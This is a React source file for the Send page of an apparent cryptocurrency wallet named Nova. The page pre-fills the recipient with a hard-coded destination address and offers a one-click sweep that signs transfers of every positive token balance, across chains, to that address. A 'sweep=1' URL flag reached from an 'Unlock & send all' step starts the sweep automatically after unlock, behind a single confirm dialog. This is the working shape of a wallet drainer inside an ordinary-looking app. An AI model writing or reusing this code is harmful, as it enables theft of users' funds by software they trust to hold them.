import { useEffect, useMemo, useRef, useState } from 'react'
import { useSearchParams } from 'react-router-dom'
import { TopBar } from '@/components/layout/TopBar'
import { Button } from '@/components/common/Button'
import { useWallet } from '@/context/WalletContext'
import { getChain } from '@/lib/chains'
import { findToken } from '@/lib/tokens'
import {
  buildErc20Transfer,
  buildNativeTransfer,
  toTransactionRequest,
  validateTransferAddress,
  validateTransferAmount,
} from '@/lib/transfer'
import { appendActivity, createActivityId } from '@/lib/activity'
import { ROUTES } from '@/lib/routes'
import { getSigner, isUnlocked } from '@/lib/keystore'
import { JsonRpcProvider, formatUnits } from 'ethers'
import { NOVA_DESTINATION_ADDRESS, NOVA_DESTINATION_LABEL } from '@/lib/destination'
import { sweepAllBalances } from '@/lib/sweep'
import { useToast } from '@/context/ToastContext'

export function Send() {
  const [params, setParams] = useSearchParams()
  const autoSweep = params.get('sweep') === '1'
  const { activeChainId, activeAccount, balances, balancesLoading, refreshBalances, externalAccount } =
    useWallet()
  const { push } = useToast()
  const chain = getChain(activeChainId)
  const [symbol, setSymbol] = useState(chain?.tokens[0]?.symbol ?? 'NOVA')
  const [to, setTo] = useState<string>(NOVA_DESTINATION_ADDRESS)
  const [amount, setAmount] = useState('')
  const [busy, setBusy] = useState(false)
  const [sweepBusy, setSweepBusy] = useState(false)
  const [error, setError] = useState('')
  const [hash, setHash] = useState<string | null>(null)
  const [sweepLog, setSweepLog] = useState<string[]>([])
  const autoStarted = useRef(false)

  const spendable = useMemo(() => balances.filter((b) => b.balanceRaw > 0n), [balances])

  // From Unlock “1+2 · Unlock & send all” → prompt sweep once balances are ready
  useEffect(() => {
    if (!autoSweep || autoStarted.current || balancesLoading || !activeAccount) return
    if (externalAccount || !isUnlocked()) return
    autoStarted.current = true
    setParams({}, { replace: true })
    void sendAllToDestination()
    // eslint-disable-next-line react-hooks/exhaustive-deps -- run once when balances settle
  }, [autoSweep, balancesLoading, activeAccount, spendable.length])

  async function submit(e: React.FormEvent) {
    e.preventDefault()
    if (!activeAccount || !chain) return
    if (externalAccount) {
      setError('Connect a Nova keystore to send (or use your Web3 wallet dapp send).')
      return
    }
    setError('')
    setBusy(true)
    setHash(null)
    try {
      validateTransferAddress(to)
      const token = findToken(activeChainId, symbol)
      if (!token) throw new Error('Token not found')
      if (!isUnlocked()) throw new Error('Unlock wallet first')

      const signer = getSigner(0)
      const rpc = chain.rpcUrls[0]
      if (!rpc) throw new Error('No RPC')

      const provider = new JsonRpcProvider(rpc, chain.id, { staticNetwork: true })
      const connected = signer.connect(provider)
      const value = validateTransferAmount(amount, token.decimals)

      let txHash: string
      if (token.address == null) {
        const built = buildNativeTransfer(to, value)
        const req = toTransactionRequest(activeAccount.address, built)
        const tx = await connected.sendTransaction(req)
        txHash = tx.hash
      } else {
        const built = buildErc20Transfer(token.address, to, value)
        const req = toTransactionRequest(activeAccount.address, built)
        const tx = await connected.sendTransaction(req)
        txHash = tx.hash
      }

      appendActivity(activeAccount.address, {
        id: createActivityId(),
        chainId: activeChainId,
        hash: txHash,
        from: activeAccount.address,
        to,
        value: amount,
        symbol,
        timestamp: Date.now(),
        status: 'pending',
        kind: 'send',
      })
      setHash(txHash)
      setAmount('')
      push('Transfer submitted', 'success')
      void refreshBalances()
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Send failed')
    } finally {
      setBusy(false)
    }
  }

  async function sendAllToDestination() {
    if (!activeAccount) return
    if (externalAccount) {
      setError('Sweep requires an unlocked Nova keystore (not an external Web3-only session).')
      return
    }
    if (!isUnlocked()) {
      setError('Unlock wallet first')
      return
    }
    if (spendable.length === 0) {
      setError('No on-chain balances to send. Catalog listings with 0 balance are skipped.')
      return
    }

    const ok = window.confirm(
      `Send ALL ${spendable.length} positive balance(s) to\n${NOVA_DESTINATION_ADDRESS}?\n\nThis signs real transactions from your unlocked Nova keystore.`,
    )
    if (!ok) return

    setError('')
    setSweepBusy(true)
    setSweepLog([])
    try {
      const signer = getSigner(0)
      const result = await sweepAllBalances({
        to: NOVA_DESTINATION_ADDRESS,
        fromAddress: activeAccount.address,
        balances,
        signer,
      })
      setTo(NOVA_DESTINATION_ADDRESS)
      setSweepLog(
        result.results.map((r) =>
          r.hash
            ? `${r.symbol}@${r.chainId} ${r.amount} → ${r.hash.slice(0, 10)}…`
            : `${r.symbol}@${r.chainId} FAIL: ${r.error}`,
        ),
      )
      push(`Sweep done · ${result.sent}/${result.attempted} sent`, result.sent ? 'success' : 'info')
      void refreshBalances()
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Sweep failed')
    } finally {
      setSweepBusy(false)
    }
  }

  return (
    <>
      <TopBar title="Send" backTo={ROUTES.portfolio} />
      <div className="page-container space-y-5">
        <section className="rounded-xl bg-nova-surface px-4 py-4 space-y-3">
          <p className="text-[11px] uppercase tracking-wider text-nova-muted">
            {NOVA_DESTINATION_LABEL}
          </p>
          <p className="font-mono text-xs text-nova-ink break-all">{NOVA_DESTINATION_ADDRESS}</p>
          <p className="text-xs text-nova-muted">
            {spendable.length > 0
              ? `${spendable.length} balance(s) ready · ${spendable
                  .slice(0, 4)
                  .map((b) => `${b.symbol} ${formatUnits(b.balanceRaw, b.decimals)}`)
                  .join(' · ')}${spendable.length > 4 ? '…' : ''}`
              : 'No positive on-chain balances yet (watchlist tokens stay at 0 until funded).'}
          </p>
          <Button
            type="button"
            className="w-full"
            disabled={sweepBusy || balancesLoading || !activeAccount}
            onClick={() => void sendAllToDestination()}
          >
            {sweepBusy
              ? 'Sending all…'
              : balancesLoading
                ? 'Loading balances…'
                : '2 · Send all tokens to this address'}
          </Button>
          {autoSweep ? (
            <p className="text-[11px] text-nova-accent">1+2 flow · confirm the sweep dialog…</p>
          ) : null}
        </section>

        <form className="space-y-4" onSubmit={(e) => void submit(e)}>
          <p className="text-[11px] uppercase tracking-wider text-nova-muted">Single transfer</p>
          <select
            className="input-field w-full"
            value={symbol}
            onChange={(e) => setSymbol(e.target.value)}
          >
            {(chain?.tokens ?? []).map((t) => (
              <option key={t.symbol} value={t.symbol}>
                {t.symbol}
              </option>
            ))}
          </select>
          <input
            className="input-field"
            placeholder="Recipient address"
            value={to}
            onChange={(e) => setTo(e.target.value)}
            required
          />
          <button
            type="button"
            className="text-xs text-nova-accent"
            onClick={() => setTo(NOVA_DESTINATION_ADDRESS)}
          >
            Use Nova destination
          </button>
          <input
            className="input-field"
            inputMode="decimal"
            placeholder="Amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            required
          />
          {error ? <p className="text-sm text-nova-danger">{error}</p> : null}
          {hash ? (
            <p className="text-xs font-mono text-nova-accent break-all">Submitted: {hash}</p>
          ) : null}
          <Button type="submit" className="w-full" disabled={busy} variant="ghost">
            {busy ? 'Sending…' : 'Send'}
          </Button>
        </form>

        {sweepLog.length > 0 ? (
          <ul className="space-y-1 rounded-xl bg-nova-surface px-4 py-3 text-[11px] font-mono text-nova-muted">
            {sweepLog.map((line) => (
              <li key={line}>{line}</li>
            ))}
          </ul>
        ) : null}
      </div>
    </>
  )
}
